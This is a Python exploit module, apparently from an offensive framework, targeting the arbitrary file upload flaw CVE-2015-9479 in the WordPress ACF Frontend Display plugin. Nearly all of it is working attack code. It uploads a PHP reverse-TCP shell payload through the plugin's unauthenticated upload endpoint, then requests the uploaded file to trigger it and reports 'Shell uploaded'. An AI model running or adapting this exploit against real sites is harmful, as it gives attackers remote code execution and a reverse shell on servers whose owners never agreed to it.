from deathnote_module import *
from lib.http.http_client import Http_client

class Module(Exploit, Http_client):

    __info__ = {
        "name": "Wordpress Plugin ACF Frontend Display",
        "description": "Wordpress Plugin ACF Frontend Display <= 2.0.6 - Arbitrary File Upload"\
                        "The ACF-Frontend-Display plugin through 2015-07-03 for WordPress has arbitrary "\
                        "file upload via an action=upload request to js/blueimp-jQuery-File-Upload-d45deb1/server/php/index.php.",
        "cve": "2015-9479",
        "payload": {
            "default": "payloads/singles/php/reverse_tcp",
            "arch": "php",
            "platform": "php",
            "category": "singles",
            }
    }	
    
    var_years = OptString("2022", "var years for run php file", "yes")
    
    def run(self):
        
        filename = self.random_text(8)+".php"
        files = {'files': (filename, "<?php "+self.payload+"?>", "multipart/form-data")}
        
        data = {
                'action': 'upload',
                }
        
        r = self.http_request(
                        method="POST",
                        path="/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/index.php",
                        data=data,
                        files=files
        )
        if r:
            print_success("Shell uploaded")
            print_status("Trying to connect...")
            pwn = self.http_request(
                                method="GET",
                                path=f"/wp-content/uploads/uigen_{self.var_years}/{filename}"
            )